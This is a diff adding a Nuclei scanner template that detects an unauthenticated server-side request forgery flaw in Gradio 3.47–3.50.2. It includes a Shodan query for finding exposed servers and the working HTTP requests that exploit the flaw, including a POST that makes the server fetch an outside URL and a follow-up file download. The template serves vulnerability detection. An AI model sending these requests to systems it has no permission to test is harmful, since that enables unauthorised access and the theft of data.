@@ -1,0 +1,81 @@
+id: gradio-ssrf
+
+info:
+  name: Gradio 3.47 - 3.50.2 - Server-Side Request Forgery
+  author: nvn1729
+  severity: high
+  description: |
+    Gradio Full Read SSRF when auth is not enabled, this version should work for versions 3.47 - 3.50.2.
+  reference:
+    - https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2
+    - https://www.horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    epss-percentile: 0.36659
+    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:python:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: html:"__gradio_mode__"
+    product: gradio
+    vendor: gradio_project
+  tags: cve,cve2024,unauth,gradio,ssrf
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /component_server HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_any(tolower(body), "content=\"gradio", "gradio_mode", "gradio-app", "https://gradio.app")'
+          - 'contains(tolower(body), "\"method not allowed")'
+        condition: or
+        internal: true
+
+  - raw:
+      - |
+        POST /component_server HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"component_id": "{{fuzz_component_id}}", "data": "http://oast.me", "fn_name": "download_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}
+
+      - |
+        GET /file={{download_path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        name: download_path
+        group: 1
+        regex:
+          - "\"?([^\"]+)"
+        internal: true
+
+    payloads:
+      fuzz_component_id: helpers/wordlists/numbers.txt
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "<h1> Interactsh Server </h1>"
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a004830460221008abe96ca6fcfae516fdb5c9a9e859b638648a0b7a781798ce723318c1fa24b290221009a3883c6b3ace0df75e7dc92c6cf1e8d9314ede96aa6cf3bd9aa8ad2dda92883:922c64590222798bb761d5b6d8e72950
